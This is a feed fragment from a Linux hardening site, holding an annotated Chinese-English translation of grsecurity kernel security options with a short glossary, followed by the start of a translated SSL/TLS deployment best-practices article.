&lt;p&gt;&lt;strong&gt;Sysfs/debugfs restriction&lt;/strong&gt; 【（GRKERNSEC_SYSFS_RESTRICT）如果选是，在这个限制下正常挂载的sysfs以及所有在该目录下的文件系统都只能被root访问。		这些文件系统通常会提供硬件信息和调试信息的访问入口，然而这些信息却不适合被没有权限的用户看见。因为sysfs和debugfs也是一个潜在漏洞的最大的信息源ranging from infoleaks to local compromise.There has been very little oversight with an eye toward security involved in adding new exporters of information to these filesystems,所以不建议使用这些文件系统。 	因为兼容性的原因，一些目录对非root用户的访问提供了白名单：/sys/fs/selinux、/sys/fs/fuse、/sys/devices/system/cpu】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Runtime read-only mount protection&lt;/strong&gt; 【（GRKERNSEC_ROFS、kernel.grsecurity.romount_protect）如果选是，一个名为“romount_protect”的sysctl选项被产生。在运行时将这个选项设为1，文件系统将会获得如下保护：1、不允许新的可写入的加载的文件系统；2、现有的只读加载的文件系统不能被重新加载为可读可写；3、所有设备区块的写入选项都会被拒绝。 This option acts independently of grsec_lock: once it is set to 1, it cannot be turned off.		因此，如果该选项在只读系统的初始化脚本中被启用，请留意resulting behavior。		Also be aware that as with other root-focused features, GRKERNSEC_KMEM and GRKERNSEC_IO should be enabled and module loading disabled via config or at runtime.这个特性主要面向安全嵌入式系统（secure embedded systems）。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Eliminate stat/notify-based device sidechannels(（排除基于 进程状态/通知 的设备旁道攻击）&lt;/strong&gt; 【（GRKERNSEC_DEVICE_SIDECHANNEL）If you say Y here, timing analyses on block or character devices like /dev/ptmx using stat or inotify/dnotify/fanotify will be thwarted for unprivileged users. If a process without CAP_MKNOD stats such a device, the last access and last modify times will match the device’s create time. No access or modify events will be triggered through inotify/dnotify/fanotify for such devices。This feature will prevent attacks that may at a minimum allow an attacker to determine the administrator’s password length.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chroot jail restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT）如果选是，你可以选择多个选项使突破chroot的限制更困难。如果在这些选项下没有不兼容的软件，建议你把每个都打开。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny mounts&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MOUNT、kernel.grsecurity.chroot_deny_mount）如果选是，在chroot下的进程将不能再挂载或重新挂载文件系统】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny double-chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_DOUBLE、kernel.grsecurity.chroot_deny_chroot）如果选是，在chroot下的进程不能再一次使用chroot。因为这个操作是打破chroot限制的普遍方法，不应该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny pivot_root in chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_PIVOT、kernel.grsecurity.chroot_deny_pivot）如果选是，在chroot下的进程将不能使用pivot_root()方法，它就像会改变root文件系统的chroot in一样。这个方法可能在已经chroot的进程中被错误地使用来试图打破chroot限制，因此不该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Enforce chdir(“/“) on all chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHDIR、kernel.grsecurity.chroot_enforce_chdir）如果选是，所有刚刚chroot的应用的当前工作目录都会被设定到chroot的根目录下。 因为目前所知这个特性不妨碍任何软件，建议你在这里选是。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny (f)chmod +s&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHMOD、kernel.grsecurity.chroot_deny_chmod）如果选是，在chroot下的进程将不能对文件使用chmod和fchmod来使它们具有SUID或SGID位。这特性保护chroot不被其他已公布的方法打破。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny fchdir and fhandle out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FCHDIR、kernel.grsecurity.chroot_deny_fchdir）如果选是，一个非常有名的打破chroot限制的方法将会被阻止，这个方法是fchdir’ing to a file descriptor of the chrooting process that points to a directory outside the filesystem.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny mknod&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MKNOD、kernel.grsecurity.chroot_deny_mknod）如果选是，在chroot下的进程将不能使用mknod命令。   在chroot使用mknod的问题是：这将允许攻击者生成一个device entry，就像在物理层次上获得你系统的root权限，which could range from anything from the console device to a device for your harddrive(which they could then use to wipe the drive or steal data).  建议选是，除非你运行的软件不兼容。	 如果sysctl可用，一个名为”chroot_deny_mknod”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny shmat() out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SHMAT、kernel.grsecurity.chroot_deny_shmat）如果选是，在chroot下的进程将不能连接到在chroot jail外创建的共享内存段。  建议在这里选是。 如果sysctl可用，一个名为”chroot_deny_shmat”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny access to abstract AF_UNIX sockets out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_UNIX、kernel.grsecurity.chroot_deny_unix）如果选是，在chroot下的进程将不能连接到限制在chroot外部的abstract（表示不属于一个文件系统） Unix domain sockets.  建议选是。  如果sysctl可用，一个名为”chroot_deny_unix”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Protect outside processes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FINDTASK、kernel.grsecurity.chroot_findtask）如果选是，在chroot下的进程将不能杀死chroot外的进程，不能使用fcntl, ptrace, capget, getpgid, setpgid, getsid向chroot外的进程发送信号，不能查看chroot外的任何进程。	如果sysctl可用，一个名为”chroot_findtask”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict priority changes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_NICE、kernel.grsecurity.chroot_restrict_nice）如果选是，chroot下的进程将不能提升chroot下进程的优先级，或改变chroot外面的进程的优先级。	这个选项比从进程的能力设定中简单地删除CAP_SYS_NICE提供了更高的安全型。	如果sysctl可用，一个名为”chroot_restrict_nice”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny sysctl writes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SYSCTL、kernel.grsecurity.chroot_deny_sysctl）如果选是，在chroot下的攻击者将不能对sysctl的条目进行写入操作，不管是通过sysctl(2)还是通过/proc的接口。		强烈建议你在这个地方选是。如果sysctl可用，一个名为”chroot_sysctl”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Capability restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CAPS、kernel.grsecurity.chroot_caps）如果选是，在chroot jail下的所有进程的性能都会被降低到关闭以下功能：模块插入、raw I/O、系统和网络服务管理、重启系统、修改immutable文件、修改其他用户的IPC和改变系统时间。留下这个选项是因为它可能破坏某些应用。如果你的chroot下的应用执行这些任务时出现了问题，那请禁用这个选项。如果sysctl可用，一个名为”chroot_caps”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exempt initrd tasks from restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_INITRD）如果选是，先前为了初始化而启动的tasks将可以免除Grsecurity的chroot限制。This option is mainly meant to resolve Plymouth’s performing privileged operations unnecessarily in a chroot.】&lt;/p&gt;

&lt;h3 id=&quot;kernel-auditing&quot;&gt;Kernel Auditing&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Single group for auditing&lt;/strong&gt; 【（GRKERNSEC_AUDIT_GROUP、kernel.grsecurity.audit_gid、kernel.grsecurity.audit_group）如果选是,the exec and chdir logging features将只在你选定的组里面运作。	如果你只是想看特定的用户而不是系统大量的logs，这个选项建议启用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID for auditing&lt;/strong&gt; 【GRKERNSEC_AUDIT_GID】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exec logging&lt;/strong&gt; 【（GRKERNSEC_EXECLOG、kernel.grsecurity.exec_logging）如果选是，所有execve()调用都会被记录。对shell-servers的好处是保持对用户的跟踪。		如果sysctl可用，一个名为”exec_logging”的选项将被创建。	警告：这个选项启用时会产生大量的日志，特别是在活动的系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource logging&lt;/strong&gt; 【（GRKERNSEC_RESLOG、kernel.grsecurity.resource_logging）如果选是，所有超越resource限制的意图都将随着resource的名字、请求资源的大小和目前的限制被记录。高度建议你在这里选Y。如果sysctl可用，一个名为”resource_logging”的选项将被创建。如果RBAC系统也可用，这个sysctl选项的值将被忽略。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Log execs within chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_EXECLOG、kernel.grsecurity.chroot_execlog）如果选是，在chroot中的所有执行都将被记录在syslog上。如果特定的程序已安装在系统上，这会产生大量的日志。  因此留下了这个选项。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ptrace logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_PTRACE、kernel.grsecurity.audit_ptrace）如果选是，所有通过ptrace连接进程的意图都将被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chdir logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_CHDIR、kernel.grsecurity.audit_chdir）如果选是，所有chdir()调用都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(Un)Mount logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_MOUNT、kernel.grsecurity.audit_mount）如果选是，所有挂载和卸载都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Signal logging&lt;/strong&gt; 【（GRKERNSEC_SIGNAL、kernel.grsecurity.signal_logging）如果选是，特定的重要信息（如SIGSEGV）将被记录，当进程发生一个错误时它会作为一个结果通知你，这在一定程度上可能意味着a possible exploit attempt。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Fork failure logging&lt;/strong&gt; 【（GRKERNSEC_FORKFAIL、kernel.grsecurity.forkfail_logging）所有失败的fork()尝试都会被记录。这可能意味着fork炸弹，或有人正试图使他们的程序越权。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Time change logging&lt;/strong&gt; 【（GRKERNSEC_TIME、kernel.grsecurity.timechange_logging）所有系统时钟的改变都将被记录】&lt;/p&gt;

&lt;p&gt;**/proc/&lt;pid&gt;/ipaddr support** 【（GRKERNSEC_PROC_IPADDR）如果选是，一个包含用户IP地址的新条目将会被加在每个/proc/&lt;pid&gt;目录下。The IP is carried across local TCP and AF_UNIX stream sockets.This information can be useful for IDS/IPSes to perform remote response to a local attack.这个条目只能被进程的所有者看见（root用户也能看见，如果他拥有CAP_DAC_OVERRIDE。这可以通过RBAC系统删除。）因此不会产生相关的隐私】&lt;/pid&gt;&lt;/pid&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Denied RWX mmap/mprotect logging&lt;/strong&gt; 【（GRKERNSEC_RWXMAP_LOG、kernel.grsecurity.rwxmap_logging）如果选是，当被PAX_MPROTECT阻止时，calls to mmap() and mprotect() with explicit usage of PROT_WRITE and PROT_EXEC together将会被记录。 这个feature也会记录其他的当PAX_MPROTECT开启时可能有问题的方案，比如textrels and PT_GNU_STACK】&lt;/p&gt;

&lt;h3 id=&quot;executable-protections&quot;&gt;Executable Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Dmesg(8) restriction&lt;/strong&gt; 【（GRKERNSEC_DMESG、kernel.grsecurity.dmesg）如果选是，非root用户将无法使用dmesg命令查看内核环日志缓冲。内核日志缓冲经常包含有内核地址和其他对攻击者有用的标识信息，in fingerprinting（数字指纹） a system for a targeted exploit。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter ptrace-based process snoopin&lt;/strong&gt; 【（GRKERNSEC_HARDEN_PTRACE、kernel.grsecurity.harden_ptrace）如果选是，通过ptrace实现的tty嗅探程序和其他恶意监督程序将被阻止。如果你一直使用着RBAC系统，那所有用户的这个选项已经启用了好几年了，with the ability to make fine-grained（细粒度？） exceptions. 这个选项只会影响到非root用户ptrace到其他不是ptrace的子孙进程的能力。 This means that strace ./binary and gdb ./binary will still work, but attaching to arbitrary processes will not.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Require read access to ptrace sensitive binaries&lt;/strong&gt; 【（GRKERNSEC_PTRACE_READEXEC、kernel.grsecurity.ptrace_readexec）如果选是，没有权限的用户将不能ptrace不可读的二进制程序。这个选项对在移除了有suid的二进制程序的可读权限后的环境很有用——可防止内容泄露。  这个选项增加了这种文件使用的稳定性，因为当没有执行权限且ptracing时，二进制程序能被正常地读取。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce consistent multithreaded privileges&lt;/strong&gt; 【（GRKERNSEC_SETXID、kernel.grsecurity.consistent_setxid）If you say Y here, a change from a root uid to a non-root uid in a multithreaded application will cause the resulting uids, gids, supplementary(增补的） groups, and capabilities in that thread to be propagated（传送，扩散） to the other threads of the process.  在大多数情况下这是不必要的，因为glibc在应用程序的维护上会仿真这个行为。  其他的libc不会做同样的事情——允许进程的其他线程以root权限继续运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disallow access to overly-permissive（过分宽松） IPC objects&lt;/strong&gt; 【（GRKERNSEC_HARDEN_IPC、kernel.grsecurity.harden_ipc)如果选是，过分宽松的IPC对象通道（共享内存、队列信息和信号量）将被禁止，进程将在正常权限下加入以下准则检查：1、If the IPC object is world-accessible and the euid doesn’t match that of the creator or current uid for the IPC object&lt;em&gt;（//IPC对象是否可访问以及euid是否与创建者或现在IPC对象的uid不匹配）&lt;/em&gt; 2、If the IPC object is group-accessible and the egid doesn’t match that of the creator or current gid for the IPC object。  [It’s a common error to grant too much permission to these objects, with impact ranging from denial of service and information leaking to privilege escalation.]&lt;em&gt;（授予这些对象太多权限是一个常见的错误，权限的提高可能导致拒绝服务和信息泄露）&lt;/em&gt;。  拥有CAP_IPC_OWNER属性的进程仍然可以access these IPC objects.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trusted Path Execution (TPE)&lt;/strong&gt; 【（GRKERNSEC_TPE、kernel.grsecurity.tpe、kernel.grsecurity.tpe_gid）如果选是，你将可以选择一个GID加入增补的组中，里面的成员都被标记为”untrusted.”这些用户将不能执行在只有root能写入的但不属于root用户的目录中的所有文件。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Partially restrict（局部限制） all non-root users&lt;/strong&gt; 【（GRKERNSEC_TPE_ALL、kernel.grsecurity.tpe_restrict_all）如果选是，所有非root用户都将在一个削弱的TPE限制下。 This is separate from, and in addition to, the main TPE options that you have selected elsewhere.&lt;em&gt;（//与你在别处选择的TPE选项有区别，并且效果叠加？）&lt;/em&gt;  因此，如果一个”trusted” GID被选择，这个限制同样会应用在这个GID上。 Under this restriction, all non-root users will only be allowed to execute files in directories they own that are not group or world-writable, or in directories owned by root and writable only by root.&lt;em&gt;（在这个限制下，所有非root用户只被允许执行属于他们自己 并且&lt;/em&gt;不是&lt;em&gt;一个组或可写入的目录、或属于root且只能被root写入的目录下的文件。）&lt;/em&gt;】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Invert（反转？） GID option&lt;/strong&gt; 【（GRKERNSEC_TPE_INVERT、kernel.grsecurity.tpe_invert）如果选是，the group you specify in the TPE configuration will decide what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.&lt;em&gt;（你在TPE配置中指定的组将判断那些TPE组限制将会被禁用）&lt;/em&gt;  如果你想TPE限制应用在大多数用户上，这个选项很有用。  Unlike other sysctl options, this entry will default to on for backward-compatibility.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;GID for TPE-untrusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_UNTRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;enabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;GID for TPE-trusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_TRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;h3 id=&quot;network-protections&quot;&gt;Network Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Larger entropy pools&lt;/strong&gt; 【（GRKERNSEC_RANDNET）如果选是，用来存放Linux和Grsecurity的各种features的entropy pool的大小会翻倍。由于有些Grsecurity的features使用附加的随机性，所有建议你在这里选是——相当于修改/proc/sys/kernel/random/poolsize】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP/UDP blackhole and LAST_ACK DoS(Denial of Service, 拒绝服务攻击)prevention&lt;/strong&gt; 【（GRKERNSEC_BLACKHOLE、kernel.grsecurity.ip_blackhole、kernel.grsecurity.lastack_retries）如果选是，当外来数据包发送到没有程序监听的端口上，TCP重置和ICMP目标不可达数据包都不会被发送来相应该外来数据包。这个features支持IPV4和IPV6并且可以绕过回环网卡避免转发到黑洞。启用这个选项是主机对DoS攻击变得更有适应力（更主动），还能减少对扫瞄者的可视度。  这里的blackhole features实现相当于FreeBSD的blackhole feature，它对所有数据包不只是SYNs阻止RST（reset）响应。  在大多数程序执行下这不会造成问题，但程序（如haproxy）可能不会通过在远程端干净利落地终止他们来关闭特定的连接，从而让远程主机停留在LAST_ACK状态。 Because of this side-effect and to prevent intentional LAST_ACK DoSes,所有这个特性也增加automatic mitigation来应对这类攻击。  这个mitigation大幅度地减少一个socket花费在LAST_ACK state的时间。 如果你正使用haproxy并且不是所有的正连接的服务器都启用了这个选项，那在haproxy主机上禁用这个选项。  如果sysctl可用，两个名为”ip_blackhole” and “lastack_retries”的选项将被产生。当ip_blackhole进行标准的 0/非0、开/关 切换时，lastack_retries使用相同的值（”tcp_retries1” and “tcp_retries2”）。 默认的值 4 阻止一个socket保持LAST_ACK状态45秒。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable TCP Simultaneous（同时的） Connect&lt;/strong&gt; 【（GRKERNSEC_NO_SIMULT_CONNECT）如果选是，该特性将会移除Linux的strict implementation of TCP的缺点——允许两个没有均进入监听状态的client相互连接。这个缺点可以让一个攻击者很容易地阻止一个client连接上一个已知的一提供正确连接端口的服务器。  因为这个缺点可能被用来阻止杀毒软件或者IPS from fetching updates，或者阻止SSL网关获取CRL，因此这个弱点应该通过启用这个选项除去。  虽然Linux是为数不多的支持同时连接的操作系统之一，当这在现实中没有合理的用途，并且缺少防火墙的支持。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Socket restrictions&lt;/strong&gt; 【（GRKERNSEC_SOCKET）如果选是，你可以选择以下几个选项。如果你在你的系统上分配一个GID并且把它作为额外的用户组——你希望限制其中的用户对socket的访问，这个patch将表现为基于你的选项表现为三种状态。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny any sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL、kernel.grsecurity.socket_all、kernel.grsecurity.socket_all_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上或在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny all sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny client sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT、kernel.grsecurity.socket_client、kernel.grsecurity.socket_client_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上，但可以运行服务。 如果这个选项启用，当你的机器在shell中启动ftp transfers时，所有在这个组里的用户将必须使用passive mode（被动模式？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny client sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny server sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER、kernel.grsecurity.socket_server、kernel.grsecurity.socket_server_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny server sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;h3 id=&quot;physical-protections&quot;&gt;Physical Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny new USB connections after toggle&lt;/strong&gt; 【（GRKERNSEC_DENYUSB、kernel.grsecurity.deny_new_usb）如果选是，一个新的名为”deny_new_usb”的sysctl选项将被生成。 将这个选项设为1将阻止任何被OS识别的新的USB设备。所有USB设备的插入记录都会被记录。  这个选项被用来在各种USB设备中阻止被设计为渗透漏洞的USB。  为了最大的效益，在相关的启动脚本执行后这个sysctl应该被设置。  如果在发行版中的每一个用户都可以选择是否切换这个sysctl，那启用这个选项是安全的】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reject all USB devices not connected at boot&lt;/strong&gt; 【（GRKERNSEC_DENYUSB_FORCE）如果选是，一个将不生成sysctl项目的GRKERNSEC_DENYUSB的变型会被启用（意味着编译后无法再动态改变）。这个选项应该只在你确定要拒绝所有运行时的USB连接、并且不再改变初始化脚本时才启用。 这个选项不应该被distros启用。 It forces the core USB code to be built into the kernel image so that all devices connected at boot time can be recognized and new USB device connections can be prevented prior to init running.&lt;em&gt;（//强制USB的代码被build在kernel image里，以使所有在开机时就已连接的设备能被识别，并且新的USB设备将会被阻止。）&lt;/em&gt;】&lt;/p&gt;

&lt;h3 id=&quot;sysctl-support&quot;&gt;Sysctl Support&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Sysctl support&lt;/strong&gt; 【（GRKERNSEC_SYSCTL）如果选是，你可以改变Grsecurity的开机选项，而不用重新编译内核。  你可以echo 变量的值到/proc/sys/kernel/grsecurity目录来开启（1）或禁用（0）各种features。”grsec_lock”条目被设置成非0值之前，所有sysctl条目都是可变的。  如果你没有在开机时对”Turn on features by default”选项选是，所有内核配置中可用的feature都将不可用。  所有选项应被设置为startup，并且当所有选项设置好后grsec_lock应该被设置成非零值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Extra sysctl support for distro（发行版） makers (READ HELP)&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_DISTRO）如果选是，将会生成附加的sysctl选项用来控制针对root下运行进程的features。因此，当grsec_lock在开机后被启用了，使用这个选项很重要。    Only distros with prebuilt kernel packages with this option enabled that can ensure grsec_lock is enabled after boot should use this option.  &lt;em&gt;Failure to set grsec_lock after boot makes all grsec features this option covers useless&lt;/em&gt; 。目前这个选项生成如下sysctl项目：”Disable Privileged I/O”: “disable_priv_io”】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Turn on features by default&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_ON）如果选是，所有内核配置选项中选用的features都会在开机时被启用。 建议你选是，除非因为某些原因你想默认禁用所有sysctl可调的features。  就像其他地方提到的，在你完成对sysctl项目的修改之后启用grsec_lock项目非常重要。】&lt;/p&gt;

&lt;h3 id=&quot;logging-options&quot;&gt;Logging Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Seconds in between log messages (minimum)&lt;/strong&gt; 【（GRKERNSEC_FLOODTIME）这个选项允许你设定Grsecurity生成日志的时间。默认选项应该适合大多数人，如果你要更改它，选择一个足够小的数来允许生成能提供信息的日志，但应足够大以防止泛洪。  设定这个值并且将GRKERNSEC_FLOODBURST设为0，能防止Grsecurity日志的任何限制发生的概率】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Number of messages in a burst (maximum)&lt;/strong&gt; 【（GRKERNSEC_FLOODBURST）This option allows you to choose the maximum number of messages allowed within the flood time interval you chose in a separate option.  默认选项应该适合大多数人, 然而，如果你发现你的许多日志被解释为flooding，你可能需要提高这个值。Setting both this value and GRKERNSEC_FLOODTIME to 0 will disable any rate limiting on grsecurity log messages.】&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;知识索引&lt;/h2&gt;

&lt;p&gt;1、TPE:Tursted Path Execution， 是Linux内核模块。
【Trusted Path Execution (TPE) is a feature that basically denies users the ability to execute programs that are not owned by the root user, or that they can write to. This prevents all kinds of exploits（漏洞利用程序） that would have otherwise rooted your system.】&lt;/p&gt;

&lt;p&gt;2、MPROTECT：
【The goal of MPROTECT is to help prevent the introduction of new executable code into the task’s address space. This is accomplished by restricting the mmap() and mprotect() interfaces.】
   The restrictions prevent
   - creating executable anonymous mappings
   - creating executable/writable file mappings
   - making an executable/read-only file mapping writable except for performing
     relocations on an ET_DYN ELF file (non-PIC shared library)
   - making a non-executable mapping executable&lt;/p&gt;

&lt;p&gt;3、PTE( page table entries， 页表项)&lt;/p&gt;

&lt;p&gt;4、NX（No Excute， 不可执行）&lt;/p&gt;

&lt;p&gt;5、ASLR（Address space layout randomization） 【是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。】&lt;/p&gt;

&lt;p&gt;6、kexec 【kexec 是 Linux 内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec 跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 – 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。】&lt;/p&gt;

&lt;p&gt;7、Linux下设置端口权限的系统调用:
ioperm 【为调用进程设置I/O端口访问权能。ioperm的使用需要具有超级用户的权限，只有低端的[0-0x3ff] I/O端口可被设置，要想指定更多端口的权能，可使用iopl函数。这一调用只可用于i386平台。】&lt;/p&gt;

&lt;p&gt;iopl 【该调用用于修改当前进程的操作端口的权限。可以用于所有65536个端口的权限。因此，ioperm相当于该调用的子集。和ioperm一样，这一调用仅适用于i386平台。】&lt;/p&gt;

&lt;p&gt;8、hwclock 【用来显示与设定硬件时钟。在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。】&lt;/p&gt;

&lt;p&gt;9、shmat(把共享内存区对象映射到调用进程的地址空间)：连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问&lt;/p&gt;

&lt;p&gt;10、dmesg 【dmesg用来显示开机信息，kernel会将开机信息存储在ring buffer中。若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。】&lt;/p&gt;

&lt;p&gt;11、ptrace 【ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。】&lt;/p&gt;

&lt;p&gt;12、ACK 【ACK (Acknowledgement），即确认字符，在数据通信中，接收站发给发送站的一种传输类控制字符。表示发来的数据已确认接收无误。在TCP/IP协议中，如果接收方成功的接收到数据，那么会回复一个ACK数据。通常ACK信号有自己固定的格式,长度大小,由接收方回复给发送方。其格式取决于采取的网络协议。当发送方接收到ACK信号时，就可以发送下一个数据。如果发送方没有收到信号，那么发送方可能会重发当前的数据包，也可能停止传送数据。具体情况取决于所采用的网络协议。】&lt;/p&gt;

&lt;p&gt;13、IPC 【Inter-Process Communication，进程间通信】&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Aug 2015 12:46:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>SSL/TLS部署最佳实践v1.4</title>
        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)&lt;/p&gt;

&lt;p&gt;Reviewers: Lenx Wei&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;

&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;

&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;

&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
编写应用程序。&lt;/p&gt;

&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
